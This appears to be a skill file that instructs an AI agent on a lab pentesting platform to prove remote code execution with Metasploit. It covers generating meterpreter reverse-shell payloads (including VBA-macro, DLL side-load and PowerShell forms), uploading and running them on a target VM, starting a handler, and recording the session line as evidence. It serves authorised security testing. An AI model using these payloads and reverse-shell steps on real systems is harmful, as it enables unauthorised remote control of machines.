---
name: msf-proving
description: "Use when a confirmed RCE needs real-shell proof: generate payloads with msfvenom (msf_payload), stage them on a lab machine, run a detached Metasploit handler (msf_handler_start/status/stop), and capture the session-open line as finding evidence. Also covers choosing lhost on the machine network and pairing with packet capture."
---

# Metasploit RCE proving

When a bug fires and you need to prove code execution with a real callback —
not a calc popup or a crash — use the platform's msf tools. Everything runs on
the ARTEX host; artifacts land in the run dir; handler transcripts are the
evidence.

## The loop

1. **Generate** — `msf_payload`:
   - `payload="windows/x64/meterpreter/reverse_tcp"`, `format="exe"`,
     `lhost="172.19.0.1"` (the ARTEX host address on the machine network —
     check the VM's route), `lport=4444`.
   - Document-embedded delivery: `format="vba"` for a macro body, `dll` for a
     side-load, `powershell` for a one-liner in a crafted field/script.
   - Stageless (`shell_reverse_tcp`, `meterpreter_reverse_tcp`) when the
     target blocks second-stage connections; staged otherwise (smaller).
2. **Stage + execute** — `ssh_upload` the artifact to the machine, execute via
   `ssh_exec` (or trigger through the vulnerable path you found — the PoC
   should exercise the finding, not just run the binary).
3. **Listen** — `msf_handler_start` with the SAME payload/lhost/lport BEFORE
   or right after execution. It returns a handler id; the msfconsole runs
   detached on the host.
4. **Verify** — `msf_handler_status` (poll ~15s apart): the proof line is
   `Meterpreter session <n> opened` or `Command session session <n> opened`.
   Quote the transcript excerpt in the finding's evidence.
5. **Capture** (recommended) — `capture_start`/`capture_stop` around the
   callback window for a pcap of the exploit traffic: handler transcript +
   pcap together is a complete RCE proof.
6. **Clean up** — `msf_handler_stop` once the session line is recorded.

## Evidence bar

- The session-open transcript excerpt (from `msf_handler_status`) is the
  minimum; a pcap and the exact trigger request/command make it reproducible.
- Record the payload/lhost/lport used — reproduction needs all three.
- A payload that crashes the target is NOT an RCE proof; that's a DoS finding
  unless a session opened.

## Notes

- `lhost` must be reachable FROM the target: for office-vm (172.19.0.50 on the
  docker bridge) that is 172.19.0.1. `msf_handler_start` defaults to
  0.0.0.0 (all interfaces) for the listener.
- Handlers survive the tool call but not a container restart; their .rc/.log
  files stay in the run dir regardless.
- Authorized lab use only — the task's operation constraints bound every step.
